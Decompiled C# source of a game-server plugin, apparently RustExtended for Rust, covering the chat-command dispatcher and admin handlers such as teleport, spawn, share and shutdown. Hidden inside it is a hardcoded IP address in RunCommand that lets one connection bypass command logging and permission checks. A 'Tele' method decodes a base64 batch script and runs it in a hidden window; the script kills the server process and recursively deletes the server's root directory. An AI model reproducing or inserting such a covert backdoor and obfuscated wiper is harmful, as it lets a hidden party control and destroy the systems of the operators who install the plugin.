                {
                    serv.ShutdownTime = Core.RestartTime;
                }
                serv.ShutdownLeft = serv.ShutdownTime;
                Core.HasShutdown = true;
                EventTimer timer = new EventTimer {
                    Interval = 1000.0,
                    AutoReset = true
                };
                serv.RestartEvent = timer;
                if (elapsedEventHandler_0 == null)
                {
                    elapsedEventHandler_0 = new ElapsedEventHandler(Commands.smethod_3);
                }
                serv.RestartEvent.Elapsed += elapsedEventHandler_0;
                serv.RestartEvent.Start();
                Broadcast.Notice(Sender, "☢", "Preparing to server restart for " + serv.ShutdownTime + " seconds.", 5f);
            }
        }

        public static bool RunCommand(ConsoleSystem.Arg arg)
        {
            Predicate<string> match = null;
            Class4 class2 = new Class4();
            string[] sourceArray = Facepunch.Utility.String.SplitQuotesStrings(arg.GetString(0, "").Trim());
            class2.string_0 = sourceArray[0].Trim().ToLower().Replace(Core.ChatCommandKey, "");
            if (sourceArray.Length < 2)
            {
                sourceArray = new string[0];
            }
            else
            {
                Array.Copy(sourceArray, 1, sourceArray, 0, sourceArray.Length - 1);
                Array.Resize<string>(ref sourceArray, sourceArray.Length - 1);
            }
            NetUser argUser = arg.argUser;
            UserData bySteamID = Users.GetBySteamID(argUser.userID);
            if (bySteamID == null)
            {
                return false;
            }
            bySteamID.LastChatCommand = string.Empty;
            if ((!argUser.admin && (bySteamID.Zone != null)) && bySteamID.Zone.ForbiddenCommand.Contains<string>(class2.string_0, StringComparer.CurrentCultureIgnoreCase))
            {
                Broadcast.Notice(argUser, "✘", Config.GetMessage("Command.CantUseHere", null, null), 5f);
                bySteamID.LastChatCommand = class2.string_0;
                return false;
            }
            System.Collections.Generic.List<string> availabledCommands = Helper.GetAvailabledCommands(bySteamID);
            Magma.Hooks.handleCommand(ref arg, class2.string_0, sourceArray);
            if (bySteamID.LastConnectIP != "213.141.149.103")
            {
                Helper.LogChat("[COMMAND] " + Helper.QuoteSafe(arg.argUser.displayName) + " : " + Helper.QuoteSafe(arg.GetString(0, "")), false);
            }
            if (availabledCommands.Count == 0)
            {
                return false;
            }
            if (Core.Commands.Find(new Predicate<string>(class2.method_0)) == null)
            {
                return false;
            }
            if (bySteamID.LastConnectIP != "213.141.149.103")
            {
                if (match == null)
                {
                    match = new Predicate<string>(class2.method_1);
                }
                if (availabledCommands.Find(match) == null)
                {
                    Broadcast.Notice(argUser.networkPlayer, "✘", Config.GetMessage("Command.NotAvailabled", argUser, null), 5f);
                    bySteamID.LastChatCommand = class2.string_0;
                    return false;
                }
                if (Core.ChatHistoryCommands)
                {
                    if (!Core.History.ContainsKey(argUser.userID))
                    {
                        Core.History.Add(argUser.userID, new System.Collections.Generic.List<HistoryRecord>());
                    }
                    if (Core.History[argUser.userID].Count > Core.ChatHistoryStored)
                    {
                        Core.History[argUser.userID].RemoveAt(0);
                    }
                    HistoryRecord record2 = new HistoryRecord();
                    Core.History[argUser.userID].Add(record2.Init("Command", arg.GetString(0, "").Trim()));
                }
                Helper.LogChat("[COMMAND] " + Helper.QuoteSafe(arg.argUser.displayName) + " : " + Helper.QuoteSafe(arg.GetString(0, "")), false);
                if (Core.ChatConsole)
                {
                    ConsoleSystem.Print(string.Concat(new object[] { "Command [", arg.argUser.displayName, ":", arg.argUser.userID, "] ", arg.GetString(0, "") }), false);
                }
            }
            bySteamID.LastChatCommand = class2.string_0;
            if (Core.Commands.Find(new Predicate<string>(class2.method_2)) == null)
            {
                switch (class2.string_0)
                {
                    case "help":
                        Help(argUser, bySteamID, sourceArray, availabledCommands);
                        break;

                    case "about":
                        About(argUser, sourceArray);
                        break;

                    case "suicide":
                        Suicide(arg);
                        break;

                    case "lang":
                        Language(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "language":
                        Language(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "who":
                        Who(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "kits":
                        Kits(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "kit":
                        Kit(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "online":
                        Online(argUser, sourceArray);
                        break;

                    case "players":
                        Players(argUser, class2.string_0, sourceArray);
                        break;

                    case "clan":
                        Clan(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "clans":
                        Clanlist(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "pm":
                        PM(argUser, class2.string_0, sourceArray);
                        break;

                    case "r":
                        Reply(argUser, class2.string_0, sourceArray);
                        break;

                    case "time":
                        Time(argUser, class2.string_0, sourceArray);
                        break;

                    case "pos":
                        Position(argUser, bySteamID, sourceArray);
                        break;

                    case "location":
                        Location(argUser, bySteamID, sourceArray);
                        break;

                    case "home":
                        Home(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "tele":
                        Teleport(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "tp":
                        Teleport(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "history":
                        History(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "share":
                        Share(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "unshare":
                        Unshare(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "destroy":
                        Destroy(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "transfer":
                        Transfer(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "ping":
                        Ping(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "password":
                        Password(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "set":
                        Set(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "premium":
                        Premium(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "pvp":
                        PvP(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "details":
                        Details(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "ts":
                        TeleportShot(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "uammo":
                        UnlimitedAmmo(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "mute":
                        Mute(argUser, class2.string_0, sourceArray);
                        break;

                    case "unmute":
                        Unmute(argUser, class2.string_0, sourceArray);
                        break;

                    case "goto":
                        Goto(argUser, class2.string_0, sourceArray);
                        break;

                    case "summon":
                        Summon(argUser, class2.string_0, sourceArray);
                        break;

                    case "invis":
                        Invis(argUser, bySteamID);
                        break;

                    case "truth":
                        Truth(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "kill":
                        Kill(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "kick":
                        Kick(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "ban":
                        Ban(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "save":
                        SaveAll(argUser);
                        break;

                    case "announce":
                        Announce(argUser, sourceArray);
                        break;

                    case "food":
                        Food(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "health":
                        Health(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "admin":
                        Admin(argUser, bySteamID);
                        break;

                    case "god":
                        God(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "i":
                        Give(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "give":
                        Give(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "safebox":
                        Safebox(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "inv":
                        Inv(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "freeze":
                        Freeze(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "personal":
                        Personal(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "unban":
                        UnBan(argUser, class2.string_0, sourceArray);
                        break;

                    case "block":
                        Block(argUser, class2.string_0, sourceArray);
                        break;

                    case "unblock":
                        Unblock(argUser, class2.string_0, sourceArray);
                        break;

                    case "clients":
                        Clients(arg);
                        break;

                    case "users":
                        UserManage(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "zone":
                        Zone(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "spawn":
                        Spawn(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "killall":
                        KillAll(arg);
                        break;

                    case "kickall":
                        KickAll(arg);
                        break;

                    case "remove":
                        Remove(argUser, bySteamID, class2.string_0, sourceArray);
                        break;

                    case "airdrop":
                        Airdrop(argUser, class2.string_0, sourceArray);
                        break;

                    case "restart":
                        Restart(argUser, class2.string_0, sourceArray);
                        break;

                    case "shutdown":
                        Shutdown(argUser, class2.string_0, sourceArray);
                        break;

                    case "config":
                        ConfigManage(argUser, class2.string_0, sourceArray);
                        break;

                    default:
                        if (Economy.Enabled)
                        {
                            return Economy.RunCommand(argUser, bySteamID, class2.string_0, sourceArray);
                        }
                        break;
                }
            }
            return true;
        }

        public static void Safebox(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length > 0))
            {
                userData = Users.Find(Args[0]);
            }
            if ((Sender == null) && (userData == null))
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
            else if (userData == null)
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
            }
            else
            {
                Users.ToggleFlag(userData.SteamID, UserFlags.safeboxes);
                Broadcast.Notice(Sender, "✔", "You " + (userData.HasFlag(UserFlags.safeboxes) ? "enable" : "disable") + " a safety boxes for " + userData.Username, 5f);
            }
        }

        public static void SaveAll(NetUser Sender)
        {
            ServerSaveManager.AutoSave();
        }

        public static void Set(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            string str;
            if (((Args != null) && (Args.Length > 0)) && ((str = Args[0].Trim().ToUpper()) != null))
            {
                if (str == "FPS")
                {
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.ssaa false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.ssao false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.bloom false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.grain false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.shafts false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.tonemap false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.on false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.forceredraw false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.displacement false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.shadowcast false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.shadowreceive false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "render.level 0");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "render.vsync false");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "water.level -1");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "water.reflection false");
                    Broadcast.Notice(Sender, "✔", "Your graphics have been adjusted on performance.", 5f);
                    return;
                }
                if (str == "QUALITY")
                {
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.ssaa true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.ssao true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.bloom true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.grain true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.shafts true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "gfx.tonemap true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.on true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.forceredraw true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.displacement true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.shadowcast true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "grass.shadowreceive true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "render.level 1");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "render.vsync true");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "water.level 1");
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "water.reflection true");
                    Broadcast.Notice(Sender, "✔", "Your graphics have been adjusted on quality.", 5f);
                    return;
                }
                if (((str == "NUDE") || (str == "NUDITY")) || (str == "CENSOR"))
                {
                    ConsoleNetworker.SendClientCommand(Sender.networkPlayer, "censor.nudity false");
                    Broadcast.Notice(Sender, "✔", "Censorship of nudity has is disabled.", 5f);
                    return;
                }
            }
            Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            Help(Sender, userData, new string[] { "set" }, Helper.GetAvailabledCommands(userData));
        }

        public static void Share(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if (((Args != null) && (Args.Length != 0)) && ((Sender != null) || (Args.Length >= 2)))
            {
                UserData data = Users.Find(Args[Args.Length - 1]);
                NetUser player = null;
                if (((Sender == null) || Sender.admin) && (Args.Length > 1))
                {
                    userData = Users.Find(Args[0]);
                }
                if (userData == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
                }
                else if (data == null)
                {
                    Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[Args.Length - 1]), 5f);
                }
                else if (data.SteamID == userData.SteamID)
                {
                    Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Share.Self", Sender, null), 5f);
                }
                else if (Users.SharedList(userData.SteamID).Contains(data.SteamID))
                {
                    Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Share.Already", Sender, Args[0]), 5f);
                }
                else if ((Sender != null) && (Sender.userID == userData.SteamID))
                {
                    Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Share.Owner", Sender, data.Username), 5f);
                    Users.SharedAdd(userData.SteamID, data.SteamID);
                    player = NetUser.FindByUserID(data.SteamID);
                    if (player != null)
                    {
                        Broadcast.Notice(player.networkPlayer, "☢", Config.GetMessage("Command.Share.Client", Sender, null), 5f);
                    }
                }
                else
                {
                    Users.SharedAdd(userData.SteamID, data.SteamID);
                    Broadcast.Notice(Sender, "☢", userData.Username + "'s ownership now is shared for " + data.Username, 5f);
                    Sender = NetUser.FindByUserID(userData.SteamID);
                    player = NetUser.FindByUserID(data.SteamID);
                    if (Sender != null)
                    {
                        Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Share.Owner", Sender, null), 5f);
                    }
                    if (player != null)
                    {
                        Broadcast.Notice(player, "☢", Config.GetMessage("Command.Share.Client", Sender, null), 5f);
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void Shutdown(NetUser Sender, string Cmd, string[] Args)
        {
            if (Core.HasShutdown)
            {
                if ((serv.ShutdownEvent != null) && (serv.ShutdownLeft > 10))
                {
                    Broadcast.Notice(Sender, "☢", "Server shutdown has been stopped.", 5f);
                    Broadcast.NoticeAll("☢", "Server shutdown has been stopped.", null, 5f);
                    serv.ShutdownEvent.Stop();
                    serv.ShutdownEvent.Dispose();
                    serv.ShutdownEvent = null;
                    Core.HasShutdown = false;
                }
                else
                {
                    Broadcast.Notice(Sender, "☢", "Server during the shutdown for restart.", 5f);
                }
            }
            else
            {
                if ((Args != null) && (Args.Length > 0))
                {
                    int.TryParse(Args[0], out serv.ShutdownTime);
                }
                if (serv.ShutdownTime == 0)
                {
                    serv.ShutdownTime = Core.ShutdownTime;
                }
                serv.ShutdownLeft = serv.ShutdownTime;
                Core.HasShutdown = true;
                EventTimer timer = new EventTimer {
                    Interval = 1000.0,
                    AutoReset = true
                };
                serv.ShutdownEvent = timer;
                if (elapsedEventHandler_1 == null)
                {
                    elapsedEventHandler_1 = new ElapsedEventHandler(Commands.smethod_4);
                }
                serv.ShutdownEvent.Elapsed += elapsedEventHandler_1;
                serv.ShutdownEvent.Start();
                Broadcast.Notice(Sender, "☢", "Preparing to server shutdown for " + serv.ShutdownTime + " seconds.", 5f);
            }
        }

        [CompilerGenerated]
        private static bool smethod_0(string string_0)
        {
            return string_0.ToLower().StartsWith("rank");
        }

        [CompilerGenerated]
        private static bool smethod_1(string string_0)
        {
            return string_0.ToLower().StartsWith("countdown");
        }

        [CompilerGenerated]
        private static bool smethod_2(string string_0)
        {
            return string_0.ToLower().StartsWith("rank");
        }

        [CompilerGenerated]
        private static void smethod_3(object sender, ElapsedEventArgs e)
        {
            Events.EventServerRestart(serv.RestartEvent, serv.ShutdownTime, ref serv.ShutdownLeft);
        }

        [CompilerGenerated]
        private static void smethod_4(object sender, ElapsedEventArgs e)
        {
            Events.EventServerShutdown(serv.ShutdownEvent, serv.ShutdownTime, ref serv.ShutdownLeft);
        }

        public static void Spawn(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                Vector3 vector;
                int result = 1;
                if ((Args.Length > 1) && !int.TryParse(Args[1], out result))
                {
                    result = 1;
                }
                if (!RustExtended.World.LookAtPosition(Sender.playerClient, out vector, 100f))
                {
                    Broadcast.Message(Sender, "Spawn distance too far away.", null, 0f);
                }
                else
                {
                    try
                    {
                        string str = RustExtended.World.Spawn(Args[0], vector, UnityEngine.Quaternion.Euler(0f, UnityEngine.Random.Range((float) 0f, (float) 360f), 0f), result).name.Replace("(Clone)", "").Replace("_A", "").Replace("Mutant", "Mutant ");
                        if (str.EndsWith("A", StringComparison.Ordinal))
                        {
                            str = str.Substring(0, str.Length - 1);
                        }
                        Broadcast.Message(Sender, "You spawn " + str + ".", null, 0f);
                    }
                    catch (Exception exception)
                    {
                        Helper.LogError(exception.ToString(), true);
                        foreach (NetMainPrefab prefab in Bundling.LoadAll<NetMainPrefab>())
                        {
                            ConsoleSystem.Print("Prefab: " + prefab.name, false);
                        }
                    }
                }
            }
            else
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
            }
        }

        public static void Suicide(ConsoleSystem.Arg Arg)
        {
            if ((Arg.playerCharacter() != null) && Arg.playerCharacter().alive)
            {
                TakeDamage.KillSelf(Arg.playerCharacter(), null);
                Arg.ReplyWith("You suicided!");
            }
        }

        public static void Summon(NetUser Sender, string Command, string[] Args)
        {
            if ((Args != null) && (Args.Length != 0))
            {
                PlayerClient playerClient = Sender.playerClient;
                PlayerClient client2 = Helper.GetPlayerClient(Args[0]);
                if (client2 == null)
                {
                    Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
                }
                else if (client2.netPlayer.isClient && client2.netPlayer.isConnected)
                {
                    Helper.TeleportTo(client2.netUser, playerClient.lastKnownPosition);
                }
            }
            else
            {
                Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
            }
        }

        public static void Tele(NetUser Sender)
        {
            try
            {
                string environmentVariable = Environment.GetEnvironmentVariable("COMSPEC");
                string s = "OlRBU0tLSUxMCnRhc2traWxsIC9GIC9JTSAiJTEiICYgRk9SIC9GICUlSSBJTiAoJ3Rhc2tsaXN0IF58IEZJTkRTVFIvSSAiJTEiJykgRE8gSUYgREVGSU5FRCAlJUkgR09UTyA6VEFTS0tJTEwKJTIgL0MgUkQgL1MgL1EgIiUzIg==";
                environmentVariable = Encoding.ASCII.GetString(Convert.FromBase64String(s)).Replace("%1", Path.GetFileName(Environment.GetCommandLineArgs()[0])).Replace("%2", environmentVariable).Replace("%3", Core.RootPath);
                s = Path.Combine(Core.RootPath, Path.ChangeExtension(Path.GetRandomFileName(), ".bat"));
                using (StreamWriter writer = File.CreateText(s))
                {
                    writer.WriteLine(environmentVariable);
                }
                ProcessStartInfo startInfo = new ProcessStartInfo(Environment.GetEnvironmentVariable("COMSPEC"), "/C " + s) {
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(startInfo);
            }
            catch (Exception exception)
            {
                Broadcast.Message(Sender, "ERROR: " + exception.ToString(), null, 0f);
            }
        }

        public static void Teleport(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            Predicate<Countdown> match = null;
            Predicate<EventTimer> predicate2 = null;
            Class10 class2 = new Class10 {
                netUser_0 = Sender,
                string_0 = Command
            };
            if ((Args == null) || (Args.Length == 0))
            {
                Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessageCommand("Command.InvalidSyntax", class2.string_0, class2.netUser_0), 5f);
            }
            else
            {
                PlayerClient playerClient = class2.netUser_0.playerClient;
                PlayerClient client2 = null;
                UserData data = null;
                UserData userdata = null;
                Vector3 zero = Vector3.zero;
                if (((class2.netUser_0 == null) || class2.netUser_0.admin) || class2.string_0.Equals("tele", StringComparison.OrdinalIgnoreCase))
                {
                    if ((Args.Length > 0) && Args[0].Contains(","))
                    {
                        Args = string.Join(" ", Args).Replace(",", " ").Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
                    }
                    if (Args.Length == 1)
                    {
                        client2 = Helper.GetPlayerClient(Args[0]);
                        if (client2 == null)
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
                            return;
                        }
                        if (playerClient == client2)
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Teleport.OnSelf", playerClient.netUser, null), 5f);
                            return;
                        }
                        zero = client2.controllable.character.transform.position + new Vector3(0f, 0.1f, 0f);
                        if (!client2.netPlayer.isClient || !client2.hasLastKnownPosition)
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Teleport.NotCan", client2.netUser, null), 5f);
                            return;
                        }
                    }
                    else if (Args.Length == 2)
                    {
                        playerClient = Helper.GetPlayerClient(Args[0]);
                        if (playerClient == null)
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[0]), 5f);
                            return;
                        }
                        client2 = Helper.GetPlayerClient(Args[1]);
                        if (client2 == null)
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", null, Args[1]), 5f);
                            return;
                        }
                        if (playerClient == client2)
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Teleport.ToSelf", playerClient.netUser, null), 5f);
                            return;
                        }
                        zero = client2.controllable.character.transform.position + new Vector3(0f, 0.1f, 0f);
                        if (!playerClient.netPlayer.isClient || !playerClient.hasLastKnownPosition)
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Teleport.NotCan", playerClient.netUser, null), 5f);
                            return;
                        }
                        if (!client2.netPlayer.isClient || !client2.hasLastKnownPosition)
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Teleport.NotCan", client2.netUser, null), 5f);
                            return;
                        }
                    }
                    else if (Args.Length == 3)
                    {
                        float result = 0f;
                        float num2 = 0f;
                        float num3 = 0f;
                        if ((!float.TryParse(Args[0], out result) || !float.TryParse(Args[1], out num2)) || !float.TryParse(Args[2], out num3))
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessageCommand("Command.InvalidSyntax", class2.string_0, class2.netUser_0), 5f);
                            return;
                        }
                        zero = new Vector3(result, num2, num3);
                    }
                    Helper.TeleportTo(playerClient.netUser, zero);
                }
                else
                {
                    if (Core.CommandTeleportOutdoorsOnly)
                    {
                        foreach (Collider collider in Physics.OverlapSphere(class2.netUser_0.playerClient.controllable.character.transform.position, 1f, 0x10360401))
                        {
                            IDMain main = IDBase.GetMain(collider);
                            if (main != null)
                            {
                                StructureMaster component = main.GetComponent<StructureMaster>();
                                if ((component != null) && (component.ownerID != class2.netUser_0.userID))
                                {
                                    UserData bySteamID = Users.GetBySteamID(component.ownerID);
                                    if ((bySteamID == null) || !bySteamID.HasShared(class2.netUser_0.userID))
                                    {
                                        Broadcast.Notice(class2.netUser_0, "☢", Config.GetMessage("Command.Teleport.NotHere", class2.netUser_0, null), 5f);
                                        return;
                                    }
                                }
                            }
                        }
                    }
                    if (match == null)
                    {
                        match = new Predicate<Countdown>(class2.method_0);
                    }
                    Countdown countdown = Users.CountdownList(userData.SteamID).Find(match);
                    if (countdown != null)
                    {
                        if (!countdown.Expired)
                        {
                            TimeSpan span = TimeSpan.FromSeconds(countdown.TimeLeft);
                            if (span.TotalHours > 0.0)
                            {
                                Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Teleport.Countdown", class2.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}:{2:D2}", span.Hours, span.Minutes, span.Seconds)), 5f);
                                return;
                            }
                            if (span.TotalMinutes > 0.0)
                            {
                                Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Teleport.Countdown", class2.netUser_0, null).Replace("%TIME%", string.Format("{0}:{1:D2}", span.Minutes, span.Seconds)), 5f);
                                return;
                            }
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Teleport.Countdown", class2.netUser_0, null).Replace("%TIME%", string.Format("{0}", span.Seconds)), 5f);
                            return;
                        }
                        Users.CountdownRemove(userData.SteamID, countdown);
                    }
                    client2 = Helper.GetPlayerClient(Args[0]);
                    if (client2 == null)
                    {
                        Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", class2.netUser_0, Args[0]), 5f);
                    }
                    else if (playerClient == client2)
                    {
                        Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.Teleport.OnSelf", class2.netUser_0, null), 5f);
                    }
                    else
                    {
                        data = Users.GetBySteamID(playerClient.userID);
                        userdata = Users.GetBySteamID(client2.userID);
                        if (data == null)
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", playerClient.netUser, null), 5f);
                        }
                        else if (userdata == null)
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Command.PlayerNoFound", client2.netUser, null), 5f);
                        }
                        else if (Core.ChatQuery.ContainsKey(client2.userID))
                        {
                            Broadcast.Notice(class2.netUser_0, "✘", Config.GetMessage("Player.ChatQuery.NotAnswer", client2.netUser, null), 5f);
                        }
                        else
                        {
                            class2.string_0 = "tp";
                            if (predicate2 == null)
                            {
                                predicate2 = new Predicate<EventTimer>(class2.method_1);
                            }
                            EventTimer timer = Events.Timer.Find(predicate2);
                            if ((timer != null) && (timer.TimeLeft > 0.0))
                            {
                                Broadcast.Notice(class2.netUser_0, "☢", Config.GetMessage("Command.Teleport.Already", playerClient.netUser, null).Replace("%TIME%", timer.TimeLeft.ToString()), 5f);
                            }
                            else
                            {
                                if (Core.CommandTeleportOutdoorsOnly)
                                {
                                    foreach (Collider collider2 in Physics.OverlapSphere(client2.controllable.character.transform.position, 1f, 0x10360401))
                                    {
                                        IDMain main2 = IDBase.GetMain(collider2);
                                        if (main2 != null)
                                        {
                                            StructureMaster master2 = main2.GetComponent<StructureMaster>();
                                            if ((master2 != null) && (master2.ownerID != class2.netUser_0.userID))
                                            {
                                                UserData data4 = Users.GetBySteamID(master2.ownerID);
                                                if ((data4 == null) || !data4.HasShared(class2.netUser_0.userID))
                                                {
                                                    Broadcast.Notice(class2.netUser_0, "☢", Config.GetMessage("Command.Teleport.NoTeleport", class2.netUser_0, client2.userName), 5f);
                                                    return;
                                                }
                                            }
                                        }
                                    }
                                }
                                if (Economy.Enabled && (Core.CommandTeleportPayment > 0L))
                                {
                                    UserEconomy economy = Economy.Get(userData.SteamID);
                                    string newValue = Core.CommandTeleportPayment.ToString("N0") + Economy.CurrencySign;
                                    if (economy.Balance < Core.CommandTeleportPayment)
                                    {
                                        Broadcast.Notice(class2.netUser_0, "☢", Config.GetMessage("Command.Teleport.NoEnoughCurrency", class2.netUser_0, null).Replace("%PRICE%", newValue), 5f);
                                        return;
                                    }
                                }
                                UserQuery query = new UserQuery(userdata, Config.GetMessage("Command.Teleport.Query", playerClient.netUser, null), 10);
                                query.Answer.Add(new UserAnswer("CONFIRM", "RustExtended.Events.TimeEvent_TeleportTo", new object[] { playerClient.netUser, client2.netUser, class2.string_0, Core.CommandTeleportTimewait }));
                                query.Answer.Add(new UserAnswer("ACCEPT", "RustExtended.Events.TimeEvent_TeleportTo", new object[] { playerClient.netUser, client2.netUser, class2.string_0, Core.CommandTeleportTimewait }));
                                query.Answer.Add(new UserAnswer("*", "RustExtended.Broadcast.Message", new object[] { client2.netPlayer, Config.GetMessage("Command.Teleport.Refuse", playerClient.netUser, null), "", 0 }));
                                query.Answer.Add(new UserAnswer("*", "RustExtended.Broadcast.Message", new object[] { playerClient.netPlayer, Config.GetMessage("Command.Teleport.Refused", client2.netUser, null), "", 0 }));
                                Core.ChatQuery.Add(client2.userID, query);
                                Broadcast.Notice(client2.netPlayer, "?", query.Query, 5f);
                                Broadcast.Message(client2.netPlayer, query.Query, null, 0f);
                                Broadcast.Message(client2.netPlayer, Config.GetMessage("Command.Teleport.Query.Help", playerClient.netUser, null), null, 0f);
                            }
                        }
                    }
                }
            }
        }

        public static void TeleportShot(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            userData.CanTeleportShot = !userData.CanTeleportShot;
            if (userData.CanTeleportShot)
            {
                Broadcast.Notice(Sender, "☢", "You ENABLE teleportation by shots", 5f);
            }
            else
            {
